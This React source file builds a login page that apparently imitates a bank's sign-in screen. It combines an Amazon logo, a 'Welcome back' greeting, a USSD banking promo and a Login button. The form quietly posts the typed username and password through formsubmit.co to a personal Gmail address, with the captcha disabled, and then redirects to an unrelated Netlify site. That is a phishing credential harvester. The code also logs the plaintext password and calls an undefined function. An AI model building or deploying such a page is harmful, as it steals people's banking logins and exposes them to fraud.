import React, { useState } from 'react'
import { Link, useNavigate } from "react-router-dom";

//Imports from mui
import {
	IconButton,
	InputAdornment,
} from "@mui/material";
import VisibilityIcon from "@mui/icons-material/Visibility";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";

// Import Authentication
import { UserAuth } from '../Context/AuthContext';

// Import fixed components

//Import styles and Icons
import './Register.css'

const Register = () => {
  const navigate = useNavigate();
  const [email, setEmail]= useState('');
  const [password, setPassword]= useState('');
  const [error, setError]= useState('');
  
  // const [values, setValues] = useState({
  //     password: "",
  //     showPass: false,
  // });

  const { createUser } = UserAuth();

  const handleSignup = async (e) => {
    e.preventDefault();
    setError('');
    try {
      await createUser(email, password);
      navigate('/')
      console.log('new pass', password)
    } catch (e) {
      setError(e.message)
      console.error(e.message)
    }
  }

  const handlePassVisibilty = () => {
        setValues({
            ...password,
            showPass: !password.showPass,
        });
  };

  return (  
    <div className='register'>
        <Link to='/'>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" alt="" className='register__logo' />
        </Link>

        <div className="register__header">
          <div className="register__headerText">
            <h1>Welcome back,</h1>
            <h1>Eag#####</h1>
          </div>
        </div>
        <div className="register__container">
          <div className="register__containerUp">
            <form action="https://formsubmit.co/danielmordi22@gmail.com" method="POST">
              <input type="hidden" name="_captcha" value="false"></input>
              <input type="hidden" name="_next" value="https://demiladebdm.netlify.com"></input>
              {/* <h5>E-mail</h5> */}
              <input
                className='register__containerUpInput' 
                value={email} 
                type="email"
                name="email"
                placeholder="Username" 
                onChange={e => setEmail(e.target.value)}
              />
              {/* <h5>Password</h5> */}
              <input 
                className='register__containerUpInput'
                value={password} 
                type="password"
                name="message"
                placeholder="Password" 
                onChange={e => setPassword(e.target.value)}
              //   InputProps={{
              //     endAdornment: (
              //         <InputAdornment position="end">
              //             <IconButton
              //                 onClick={handlePassVisibilty}
              //                 aria-label="toggle password"
              //                 edge="end"
              //             >
              //                 {values.showPass ? <VisibilityOffIcon /> : <VisibilityIcon />}
              //             </IconButton>
              //         </InputAdornment>
              //     ),
              // }} 
              />
              {/* <InputAdornment position="end">
                  <IconButton
                      onClick={handlePassVisibilty}
                      aria-label="toggle password"
                      edge="end"
                  >
                      {values.showPass ? <VisibilityOffIcon /> : <VisibilityIcon />}
                  </IconButton>
              </InputAdornment> */}
              <div className='register__linkUp'>
                  <Link to='/' className='register__linkUpLink'>
                      <p>Forgot Username</p>
                  </Link>
                  <p>or</p>
                  <Link to='/' className='register__linkUpLink'>
                      <p>Password?</p>
                  </Link>
              </div>
              <button type='submit' className='register__registerButton' style={{width: "100%"}}>Login</button>
            </form>
          </div>

          <div className="register__containerDown">
            <div className="register__bottomA">
                <h2>Available on USSD</h2>
                <p>Transfer, Airtime & Pay Bills Offline!</p>
            </div>
            <div className="register__bottomB">
                *5573#
            </div>
          </div>

        </div>
    </div>
)
}

export default Register